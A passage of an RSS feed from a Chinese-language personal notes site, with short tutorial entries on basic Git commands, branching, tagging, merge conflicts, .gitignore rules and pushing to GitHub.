      <title>Git git log</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-log/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-log/</guid>
      <description>git log 可以让我们查看从最近到最远所有的历史提交日志，每条日志中有对应的版本号，这个版本号可以让我们回退到指定版本号的那个版本。
git log &amp;ndash;pretty=oneline 每条日志都只显示一行 多屏显示控制方式空格向下翻页 b 向上翻页 q 退出
git log &amp;ndash;graph 用于查看分支的合并图，也叫做点线图。</description>
    </item>
    
    <item>
      <title>Git git merge</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-merge/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-merge/</guid>
      <description>git merge 用于合并指定分支到当前分支
git merge BranchName 将名为 BranchName 的分支合并到当前分支。
git merge &amp;ndash;no-ff -m &amp;ldquo;merge with no-ff&amp;rdquo; BranchName 合并名为 BranchName 的分支到当前分支，并创建一个新的 commit，所以加上-m参数，将 commit 的描述写进去。</description>
    </item>
    
    <item>
      <title>Git git pull</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-pull/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-pull/</guid>
      <description>git pull 用于从远程获取代码并合并本地。
git pull origin master:dev 将远程仓库origin的master分支拉取过来，与本地的dev分支合并。
git pull origin master 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。
将远程仓库 master 分支中的内容同步到本地仓库 master 分支中</description>
    </item>
    
    <item>
      <title>Git git push</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-push/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-push/</guid>
      <description>git push 在使用git commit命令将你进行的修改从暂存区提交到本地版本库后，只剩下最后一步将本地版本库的分支推送到远程服务器上对应的分支了。
git push的一般形式为git push &amp;lt;远程主机名&amp;gt; &amp;lt;本地分支名&amp;gt; &amp;lt;远程分支名&amp;gt;，例如git push origin master：refs/for/master，即是将本地的 master 分支推送到远程主机 origin 上的 master 分支， origin 是远程主机名。第一个 master 是本地分支名，第二个 master 是远程分支名，分支名是可以修改的。
git push origin master 将本地master分支内容推送到远程库origin的master分支上，这里的master表示是远程服务器上的master分支和本地分支重名后的简写。
git push -u origin master. -u 表示 Git 不但会将本地 master 分支内容推送到远程库 origin 的 master 分支上，还会把本地的master分支和远程的master分支关联起来，在以后推送内容时就可以直接使用git push命令了，即可以省略origin master。
git push origin ：refs/for/master 如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支，等同于git push origin –delete master
git push origin TagName 推送名为TagName的标签到远程库。
git push origin :refs/tags/TagName 删除名为TagName的远程标签。
git push origin &amp;ndash;tags 推送全部未推送到远程库的本地标签。</description>
    </item>
    
    <item>
      <title>Git git rebase</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-rebase/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-rebase/</guid>
      <description>git rebase 用于把一个分支的所有修改（commit）合并到当前分支。
rebase 操作可以把本地未 push 的分叉提交历史整理成直线；
git rebase BranchName git rebase会把当前分支master的每个 commit 丢弃掉，并且把它们临时保存为patch(这些patch放到**.git/rebase目录中)，然后将BranchName分支上的commit更新到master分支上，最后把保存的这些补丁应用到更新后的master**分支上。
当master分支更新之后，它会指向原来BranchName分支上的commit，而那些原本在自己身上的commit已经被丢弃了。如果运行垃圾收集命令, 这些被丢弃的提交就会删除。
因为原本在master分支上的 commit 被丢弃了，因此，这时候的分支就变为了一条直线，
与 git merge 的区别 当我们使用Git log来参看commit时，其commit的顺序也有所不同。</description>
    </item>
    
    <item>
      <title>Git git reflog</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reflog/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reflog/</guid>
      <description>git reflog 可以查看所有分支的所有操作记录（包括已经被删除的git commit记录和git reset的操作）</description>
    </item>
    
    <item>
      <title>Git git remote</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-remote/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-remote/</guid>
      <description>git remote git remote add origin git@github.com:YxzRainy/YxzRainy.github.io.git 将一个已有的本地仓库与远程库相关联。
git remote -v 查看远程库信息</description>
    </item>
    
    <item>
      <title>Git git reset</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reset/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-reset/</guid>
      <description>git reset 用于回退版本。
git reset &amp;ndash;hard VersionNumber 可以指定回退到某一次提交后的版本号上，VersionNumber 为commit id
git reset HEAD FileNmae 将 FileName 在暂存区的修改回退到工作区，即把 FileNmae 在暂存区中删除。这里的 HEAD 表示 FileNmae 最新的版本。
git reset &amp;ndash;hard HEAD^ 在 Git 中，用HEAD表示当前版本，上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上 100 个版本写 100 个**^比较不方便，所以我们写成HEAD~100**。</description>
    </item>
    
    <item>
      <title>Git git show</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-show/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-show/</guid>
      <description>git show 查看最新的 commit 提交。
git show TagName 查看标签名为TagName的 commit 提交。</description>
    </item>
    
    <item>
      <title>Git git stash</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-stash/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-stash/</guid>
      <description>git stash 将当前工作区的文件先暂存起来，等 bug 修改完成后，再将暂存的工作区文件内容拿出来继续工作。
git stash apply 恢复后，stash内容并不删除，你需要用git stash drop来删除；
git stash pop 恢复的同时把stash内容也删了。
git stash list 查看将前被暂存的工作区。</description>
    </item>
    
    <item>
      <title>Git git switch</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-switch/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-switch/</guid>
      <description>git switch 用于切换分支。与git checkout命令的区别在于，使用新的git switch命令，比git checkout要更容易理解。
git switch -c Dev 创建并切换到新的Dev分支。
git switch Dev 直接切换到名为Dev的分支。</description>
    </item>
    
    <item>
      <title>Git git tag</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-tag/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-tag/</guid>
      <description>git tag 用于查看本地仓库的所有标签。tag 是 git 版本库的一个标记，指向某个 commit 提交的指针，它比commit id方便我们记忆。
git tag TagName 给当前分支上的HEAD打上名为TagName的标签。
git tag TagName CommitId 给 commit id 为CommitId的提交打上名为TagName的标签。
git tag -a TagName -m &amp;ldquo;Instruction&amp;rdquo; CommitId 给 commit id 为CommitId的提交打上名为TagName的标签，并添加说明文字Instruction。
git tag -d TagName 删除名为TagName的本地标签。</description>
    </item>
    
    <item>
      <title>Git 与 Github</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/git-%E4%B8%8E-github/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/git-%E4%B8%8E-github/</guid>
      <description>Git 与 Github Git Git 是一款免费、开源、并且是目前世界上最先进的分布式版本控制系统。
它是 Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！何为大佬？
Git 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，Github 是一个 Git 做版本控制的代码托管平台，Github 为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。
历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。</description>
    </item>
    
    <item>
      <title>Git 临时分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E4%B8%B4%E6%97%B6%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E4%B8%B4%E6%97%B6%E5%88%86%E6%94%AF/</guid>
      <description>临时分支 在开发过程中，Bug 就像家常便饭一样，在 Git 中，当你接到一个修复一个代号 19 的 bug 的任务时，或者接到了一个新任务，开发代号为 R 的新功能时，但现在手头上的工作进度还没有完成，这时候该怎么办呢？
这种时候我们通常可以创建一个临时的分支，在这个临时的分支上进行修复 bug 或开发新功能，最后在将这个分支合并到主分支。
暂存当前的工作进度 git stash 我们当前处于dev分支上，在这个分支上暂存工作进度
创建临时分支 git checkout -b bug18 创建一个临时分支，然后我们在这个分支上修复 bug 或开发新功能，完成后进行commit。
合并到主分支 git switch mastergit merge --no-ff -m &amp;#34;merged bug fix 101&amp;#34; issue-101 切换回主分支master，再将临时分支合并到主分支，合并完成后你可以删除临时分支。
恢复工作进度 git switch dev git stash pop 切换到 dev 分支，通常用git stash pop命令之前的恢复工作进度。
另一种恢复 git cherry-pick 4c805e2 也可以使用git cherry-pick命令恢复到指定的commitHash提交到当前分支，这样就可以避免多余的操作了。</description>
    </item>
    
    <item>
      <title>Git 什么是分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%86%E6%94%AF/</guid>
      <description>什么是分支 分支就是科幻电影里面的平行宇宙，当你正在电脑前努力学习 Git 的时候，另一个你正在另一个平行宇宙里努力学习 SVN。
当两个平行宇宙互不干扰时，那对现在的你也没啥影响。不过，在某个时间点，两个平行宇宙合并了，结果，你既学会了 Git 又学会了 SVN！
分支有什么用 假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了 50% 的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人无法干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。
现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</description>
    </item>
    
    <item>
      <title>Git 什么是版本控制系统</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E4%BB%80%E4%B9%88%E6%98%AF%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F/</guid>
      <description>什么是版本控制系统 所有的版本控制系统，其实 只能跟踪文本文件的改动，比如 TXT 文件，HTML，所有的程序代码文档等等，Git 也不例外。版本控制系统可以告诉你每次的改动，比如在第 5 行加了一个单词 Linux ，在第 8 行删了一个单词 Windows 。
而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件内容（二进制编码）的变化，只能把二进制文件每次改动串起来，也就是只知道图片从 100KB 改成了 120KB，但具体改了啥，在文件的哪里作了修改，版本控制系统并不知道，也没法知道。这里值得注意的是，Microsoft 的 Word 格式是二进制格式，因此，版本控制系统是没法跟踪 Word 文件的改动的。
因此，我这里比较推荐使用 markdown 作为文本编辑的格式，以及我个人比较喜欢使用 Typora 编辑 markdown 文件，之后再用 Vs code + git，推送到 GitHub 上，非常的方便。</description>
    </item>
    
    <item>
      <title>Git 克隆远程库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%85%8B%E9%9A%86%E8%BF%9C%E7%A8%8B%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%85%8B%E9%9A%86%E8%BF%9C%E7%A8%8B%E5%BA%93/</guid>
      <description>克隆远程库 通常，当我们在 Github 上创建了一个远程库时，有时候需要多个人协作共同修改这个远程库，这时候我们就可以在多台设备上克隆这个远程库，并将它放到本地
克隆远程库 接下来我们使用git clone RemoteAddress命令将我们刚刚创建的远程库克隆到本地。
git clone git@github.com:YxzRainy/YxzRainy.github.io.git GitHub 给出的克隆地址不止一个，还可以用https://github.com/michaelliao/gitskills.git这样的地址。实际上，Git 支持多种协议，默认的git://使用 ssh，但也可以使用https等其他协议。
使用https除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放 http 端口的公司内部就无法使用ssh协议而只能用https。</description>
    </item>
    
    <item>
      <title>Git 分支是如何工作的</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84/</guid>
      <description>分支是如何工作的 主分支 在 Git 里，有一个默认的主分支，即master。HEAO严格来说并不是指向当前版本，而是指向的master，master才是指向当前版本的。所以，HEAD指向的就是当前分支，而当前分支的指针就是指向的当前版本。
commit 后分支的变化 每次提交，master都会向前进一个版本，这样，随着你不断提交，master的线也越来越长。
当我们新建一个dev分支，指向与master相同的提交，再把HEAD指向dev，就表示我们当前在dev上工作。
新增分支 从现在开始，对工作区的修改和提交就是在dev分支上了，比如再一次提交后，dev分支就往前进一个版本，而master分支不变。
合并分支 现在，我们在dev上的工作完成了，可以把dev合并到master上，直接把master指向dev的当前版本，就完成了合并。
删除分支 合并分支后，你可以删掉dev分支，删掉后，我们就只剩下master分支。</description>
    </item>
    
    <item>
      <title>Git 分支管理策略</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E7%AD%96%E7%95%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E7%AD%96%E7%95%A5/</guid>
      <description>分支管理策略 在实际开发中，我们应该按照几个基本原则进行分支管理：
首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；
那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；
你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。
所以，团队合作的分支看起来就像这样：</description>
    </item>
    
    <item>
      <title>Git 创建并合并分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E5%B9%B6%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E5%B9%B6%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF/</guid>
      <description>创建并合并分支 创建文件 目前我们处于 Git 给我们创建的默认 maser 分支下，我们需要在这个分支下进行一些工作。
我们先创建一个文件 ReadMe.txt 来作为我们的本次的工作文件。
提交文件 我们需要在maser分支上进行一次提交，以确保我们在默认分支下是进行过提交的。
git add ReadMe.txt git commit -m &amp;#34;这是第二个分支&amp;#34; 创建分支 接下来创建另一个dev分支。
git branch dev 切换分支 切换到刚才新建的dev分支。
 git checkout dev 修改文件并提交 我们在新创建的dev分支上工作，修改 ReadMe.txt，在文件中加上文本内容：“这是第二个分支”。
git add ReadMe.txt git commit -m &amp;#34;这是第二个分支&amp;#34; 再次切换分支 现在我们已经再dev分支上完成了工作，现在我们需要切换辉原分支master
git checkout master 重新查看文件 这时候会发现在master分支上，ReadMe.txt 文件中并没有文本：“这是第二个分支”。
合并分支 Fast Forward 模式合并分支 现在，我们将刚刚在dev分支上的工作成果（文件中加上文本内容：“这是第二个分支”。）合并到master分支上。
git merge dev 再查看 readme.txt 的内容，就可以看到，当前maser分支上的内容和dev分支的最新提交是完全一样的。
no Fast Forward 模式合并分支 通常，合并分支时，Git 会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。
如果要强制禁用Fast forward模式，Git 就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。
git merge --no-ff -m &amp;#34;merge describe&amp;#34; dev 删除分支 合并完成后，就可以放心地删除dev分支了</description>
    </item>
    
    <item>
      <title>Git 创建标签</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E6%A0%87%E7%AD%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E6%A0%87%E7%AD%BE/</guid>
      <description>创建标签 切换到需要打标签的分支上
git checkout master 使用命令git tag &amp;lt;name&amp;gt;就可以打一个新标签：
git tag v1.0 可以用命令git tag查看所有标签
git tag 忘记打标签 有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？
方法是找到历史提交的commit id，然后打上对应标签就可以了。
git log --pretty=oneline --abbrev-commitgit tag v2.0 c0e9bf4 创建带说明的标签 git tag -a v0.1 -m &amp;#34;version 0.1 &amp;#34; 1094adb -a指定标签名，-m指定说明文字。
标签总是和某个commit id挂钩。如果这个commit id既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。</description>
    </item>
    
    <item>
      <title>Git 创建版本库</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E7%89%88%E6%9C%AC%E5%BA%93/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%88%9B%E5%BB%BA%E7%89%88%E6%9C%AC%E5%BA%93/</guid>
      <description>创建版本库 什么是版本库 版本库又名仓库（Repository），你可以简单理解成一个目录，这个目录里面的所有文件都可以被 Git 管理起来，每个文件的修改、删除，Git 都能跟踪，以便任何时刻都可以追踪历史，并且以后随时回退到某个历史版本。
初始化 Git 目录 我们创建一个文件夹 GitFolder（文件名随意），并进入到这个文件夹，然后在命令行输入git init命令将这个目录变成可以用 Git 来管理的仓库。
git init 当目录中出现一个 .git 文件夹，就说明你的 Git 仓库初始化完成了。
这个目录是 Git 来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把 Git 仓库给破坏了。
如果你没有看到 .git 目录，那是因为这个目录默认是隐藏的，在当前文件夹输入ls -ah命令就可以看见，或者直接打开显示隐藏文件的选项。
把文件添加到版本库 现在我们编写一个 Readme.txt 文件，内容如下：
Git is a version control system. Git is free software. 一定要放到你刚才目录下创建的文件夹 GitFolder 中，子目录也行，因为这是一个 Git 仓库，放到其他地方 Git 再厉害也找不到这个文件。
把文件添加到暂存区 用命令git add告诉 Git，把文件添加到暂存区
git add readme.txt 执行上面的命令，没有任何显示，这就对了，Unix 的哲学是：没有消息就是好消息，说明文件已经成功添加到暂存区了。
提交暂存区的文件 接下来，我们用命令git commit告诉 Git，把文件提交到本地仓库
git commit -m &amp;#34;Description of this submission&amp;#34; 执行成功后，大概率会出现类似下面的提示</description>
    </item>
    
    <item>
      <title>Git 合并冲突</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%88%E5%B9%B6%E5%86%B2%E7%AA%81/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%90%88%E5%B9%B6%E5%86%B2%E7%AA%81/</guid>
      <description>合并冲突 有时候，我们在使用git merge命令进行合并的时候，会出现以下提示。
Auto-merging Rainy.txt CONFLICT (content): Merge conflict in Rainy.txt Automatic merge failed; fix conflicts and then commit the result. 会发现使用git merge自动合并失败了，git 提示我们需要手动 修复冲突，然后提交结果。
如何解决冲突 我们只需要把 Git 合并失败的文件手动编辑为我们希望的内容，再git commit即可。</description>
    </item>
    
    <item>
      <title>Git 工作区与暂存区</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%B7%A5%E4%BD%9C%E5%8C%BA%E4%B8%8E%E6%9A%82%E5%AD%98%E5%8C%BA/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E5%B7%A5%E4%BD%9C%E5%8C%BA%E4%B8%8E%E6%9A%82%E5%AD%98%E5%8C%BA/</guid>
      <description>工作区与暂存区 工作区 工作区就是你在电脑中看到的一个文件夹。它包括你实际更改的文件和当前修改但未使用git add存入暂存区的文件。
这个文件夹中有一个隐藏的目录**.git**，这个不算是工作区，它只是 Git 的版本库。
这个版本库 .git 里存了许多东西，其中最重要的就是我们的暂存区和一个 Git 自动为我们创建的第一个分支 master，以及指向这个master的一个指针HEAD。
暂存区 暂存区是一个名为 index 的文件，当我们使用git add命令添加文件的时候，实际上就是将我们的文件添加到暂存区。
接着再用git commit提交文件时，实际上就是吧暂存区里的所有文件提交到当前分支，默认这个分支为 master.
因此，当我们git commit时，就是将暂存区中的文件添加到 master 上。
你可以简单理解为，将需要提交的文件修改通通先放到暂存区，然后，再一次性提交暂存区的所有修改到分支上。
一旦提交后，如果你提交后又没有对工作区做任何修改，那么工作区就是“干净”的。
执行git status.
On branch master nothing to commit, working tree clean </description>
    </item>
    
    <item>
      <title>Git 忽略特殊文件</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%BF%BD%E7%95%A5%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E5%BF%BD%E7%95%A5%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6/</guid>
      <description>忽略特殊文件 在某些情况下，我们不想某些在工作区中的文件被提交，也就是不被git add .命令添加到暂存区，就非常有要将这些文件忽略掉（让 Git 对他们视而不见）。
我们可以在 Git 工作区的根目录下创建一个特殊的**.gitignore**文件，然后把要忽略的文件名填进去，Git 就会在git add的时候忽略这些文件。
.gitignore文件可以放到版本库里，这样可以对**.gitignore**做版本管理。
忽略文件的原则  忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如 Java 编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。  编写 .gitignore 规则 # Windows: Thumbs.db ehthumbs.db Desktop.ini  # Python: *.py[cod] *.so *.egg *.egg-info dist build  # My configurations: db.ini deploy_key_rsa 编写完成后，最后就是把**.gitignore也提交到 Git，就完成了！当然检验.gitignore的标准是使用git status命令会不会提示working directory clean**。
无法添加文件 有些时候，你想添加一个文件到 Git，但发现添加不了，原因是这个文件被**.gitignore**忽略了：
git add Rainy.classThe following paths are ignored by one of your .gitignore files:Rainy.classUse -f if you really want to add them.</description>
    </item>
    
    <item>
      <title>Git 推送分支</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%8E%A8%E9%80%81%E5%88%86%E6%94%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%8E%A8%E9%80%81%E5%88%86%E6%94%AF/</guid>
      <description>推送分支 添加文件并提交 git add . git commit -m &amp;#34;提交信息&amp;#34; 拉取分支 git pull origin master 为什么要先拉取分支呢？是因为远程库的最新提交和你试图推送的本地库不同步所导致的，因此需要先用git pull把最新的提交从origin/master上拉取到本地即可。
分支名的问题 在使用git pull origin master命令将本地分支与远程分支同步，结果出现下面的报错信息：
fatal: couldn&amp;#39;t find remote ref master 大致意思就是找不到 master 这个远程分支。
解决 只需要到你的 GitHub 上，查看仓库的默认分支即可，比如我的是main，所以我只需要将命令修改为git pull origin main即可，最后在git pull origin master，就可以将本地分支的内容推送到远程分支master上了。
合并冲突 这时候使用git pull 后合并有冲突，我们只需要把 Git 合并失败的文件手动编辑为我们希望的内容就可以解决冲突，再git commit即可。
推送分支 git push origin master 将本地库master分支上的内容推送到远程库master上去，用git push命令。
推送成功后，可以立刻在 GitHub 页面中看到远程库的内容已经和本地的一模一样了。
推送失败 有时候，当我们在用git push origin master命令时，会出现以下错误信息，通常是因为远程库的最新提交和你试图推送的本地库不同步所导致的。
master master (fetch first)Updates were rejected because the remote contains work that you donot have locally.</description>
    </item>
    
    <item>
      <title>Git 撤销修改</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E6%92%A4%E9%94%80%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
